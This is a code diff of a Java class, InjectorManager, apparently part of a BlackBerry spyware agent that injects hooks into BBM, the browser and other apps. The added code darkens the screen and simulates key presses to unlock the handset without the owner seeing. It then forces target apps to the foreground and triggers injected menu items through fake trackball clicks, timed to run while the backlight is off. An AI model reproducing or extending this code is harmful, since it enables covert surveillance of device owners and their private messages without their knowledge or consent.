@@ -1,4 +1,4 @@
-package blackberry.application;
+package blackberry.injection;
 
 import java.util.Hashtable;
 import java.util.Timer;
@@ -11,11 +11,13 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
+import blackberry.application.AppListener;
+import blackberry.application.ApplicationObserver;
+import blackberry.application.BacklightObserver;
+import blackberry.application.Device;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.injection.InjectorSystemMenu;
-import blackberry.injection.KeyInjector;
 import blackberry.injection.injectors.AInjector;
 import blackberry.injection.injectors.BBMInjector;
 import blackberry.injection.injectors.BrowserInjector;
@@ -27,17 +29,19 @@ import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
 
 /**
- * Singleton class used to manage injections of Injector-s.
- * Once initialized, it reacts on backlight and on applicationChange.
+ * Singleton class used to manage injections of Injector-s. Once initialized, it
+ * reacts on backlight and on applicationChange.
+ * 
  * @author Zeno
- *
+ * 
  */
-public class InjectorManager extends TimerTask implements ApplicationObserver,
-        iSingleton, BacklightObserver {
-    private static final long APP_TIMER_PERIOD = 0;
+public class InjectorManager implements ApplicationObserver, iSingleton,
+        BacklightObserver {
+    private static final long APP_TIMER_PERIOD = 5000;
     private static final long GUID = 0x58b6431f259bac8dL;
     private static final int RUNON_APP = 1;
     private static final int RUNON_BACKLIGHT = 2;
+    private static final int KEY_LOCK = 4099;
     //#ifdef DEBUG
     private static Debug debug = new Debug("InjectorManager",
             DebugLevel.VERBOSE);
@@ -46,13 +50,14 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
     AInjector[] injectors;
     Hashtable injectorMap = new Hashtable();
 
+    ApplicationManager manager = ApplicationManager.getApplicationManager();
+
     private InjectorSystemMenu menu;
     private Timer applicationTimer;
     private String actualMod;
     private String actualName;
     private AInjector injector;
     private boolean injecting;
-    private int runOn;
 
     public synchronized static InjectorManager getInstance() {
 
@@ -147,18 +152,27 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
         String name = injector.getCodName();
         injectorMap.put(name, injector);
 
+        setBacklight(false);
+        manager.requestForegroundForConsole();
+        unLock();
+
         if (execute(name)) {
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
             //#endif
-            Utils.sleep(1000);
-            addSystemMenu(injector);
+
             Utils.sleep(500);
-            callSystemMenu();
-            Utils.sleep(500);
-            removeSystemMenu();
-            openConsole();
-        }else{
+            if (checkForeground(name)) {
+
+                addSystemMenu(injector);
+                Utils.sleep(300);
+                callSystemMenu();
+                Utils.sleep(300);
+                removeSystemMenu();
+
+                manager.requestForegroundForConsole();
+            }
+        } else {
             //#ifdef DEBUG
             debug.trace("inject, cannot execute, disable");
             //#endif
@@ -167,9 +181,79 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
         return false;
     }
 
-    private void openConsole() {
-        ApplicationManager.getApplicationManager()
-                .requestForegroundForConsole();
+    private void setBacklight(boolean b) {
+        Backlight.enable(b);
+    }
+
+    private boolean backlightEnabled() {
+        return Backlight.isEnabled();
+    }
+
+    /**
+     * verifica se occorre procedere con l'unlock.
+     */
+    private void unLock() {
+        //#ifdef DEBUG
+        debug.trace("unLock");
+        //#endif
+
+        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+        Utils.sleep(200);
+
+        if (backlightEnabled()) {
+            //#ifdef DEBUG
+            debug.trace("Backlight still enabled, getHardwareLayout: "
+                    + Keypad.getHardwareLayout());
+            //#endif
+
+            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+            Utils.sleep(200);
+            KeyInjector.pressRawKeyCode(KEY_LOCK);
+            Utils.sleep(200);
+            setBacklight(false);
+            Utils.sleep(500);
+            for (int i = 0; i < 10; i++) {
+                if (backlightEnabled()) {
+                    //Backlight.enable(false);
+                    Utils.sleep(500);
+                    //#ifdef DEBUG
+                    debug.trace("unLock: backlight still enabled");
+                    //#endif
+                } else {
+                    break;
+                }
+            }
+
+            return;
+        }
+
+        //Main.getInstance().showBlackScreen(false); 
+    }
+
+    private boolean checkForeground(String codname) {
+        int foregroundPin = manager.getForegroundProcessId();
+        ApplicationDescriptor[] apps = manager.getVisibleApplications();
+        for (int i = 0; i < apps.length; i++) {
+            //#ifdef DEBUG
+            debug.trace("checkForeground: " + apps[i].getName());
+            //#endif
+            if (apps[i].getModuleName().indexOf(codname) >= 0) {
+                int processId = manager.getProcessId(apps[i]);
+
+                if (foregroundPin == processId) {
+                    //#ifdef DEBUG
+                    debug.trace("checkForeground, found");
+                    //#endif
+                    return true;
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("checkForeground, found but not foreground");
+                    //#endif
+                    return false;
+                }
+            }
+        }
+        return false;
     }
 
     private void removeSystemMenu() {
@@ -194,18 +278,20 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version 7, track ball up");
             //#endif
-            Utils.sleep(200);
             KeyInjector.trackBallRaw(20, true);
-            Utils.sleep(300);
+            Utils.sleep(500);
             KeyInjector.trackBallRawClick();
         } else {
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version <7, pressing menu");
             //#endif
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-            Utils.sleep(300);
+            Utils.sleep(500);
             KeyInjector.trackBallRawClick();
         }
+
+        Utils.sleep(500);
+        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
     }
 
@@ -288,14 +374,6 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
 
     }
 
-    public void run() {
-        if (runOn == RUNON_APP) {
-            runOnApp();
-        } else if (runOn == RUNON_BACKLIGHT) {
-            runOnBacklight();
-        }
-    }
-
     public void runOnBacklight() {
         //#ifdef DEBUG
         debug.trace("runOnBacklight");
@@ -343,6 +421,24 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
                 }
             }
         }
+    }
+
+    class RunInjectorTask extends TimerTask {
+
+        private int runOn;
+
+        RunInjectorTask(int runOn) {
+            this.runOn = runOn;
+
+        }
+
+        public void run() {
+            if (runOn == RUNON_APP) {
+                runOnApp();
+            } else if (runOn == RUNON_BACKLIGHT) {
+                runOnBacklight();
+            }
+        }
 
     }
 
@@ -359,7 +455,7 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
             applicationTimer = null;
         }
 
-        if (injectorMap.contains(startedMod)) {
+        if (injectorMap.containsKey(startedMod)) {
             //#ifdef DEBUG
             debug.trace("onApplicationChange, starting");
             //#endif
@@ -367,13 +463,16 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
             this.actualName = startedName;
             applicationTimer = new Timer();
 
-            runOn = RUNON_APP;
-            applicationTimer.schedule(this, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
+            RunInjectorTask task = new RunInjectorTask(RUNON_APP);
+            applicationTimer.schedule(task, 1000, APP_TIMER_PERIOD);
         }
 
     }
 
     public void onBacklightChange(boolean status) {
+        //#ifdef DEBUG
+        debug.trace("onBacklightChange: " + status);
+        //#endif
         if (!status) {
             if (applicationTimer != null) {
                 applicationTimer.cancel();
@@ -381,8 +480,9 @@ public class InjectorManager extends TimerTask implements ApplicationObserver,
             }
 
             applicationTimer = new Timer();
-            runOn = RUNON_BACKLIGHT;
-            applicationTimer.schedule(this, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
+            RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
+
+            applicationTimer.schedule(task, 11000, Integer.MAX_VALUE);
         }
     }
 
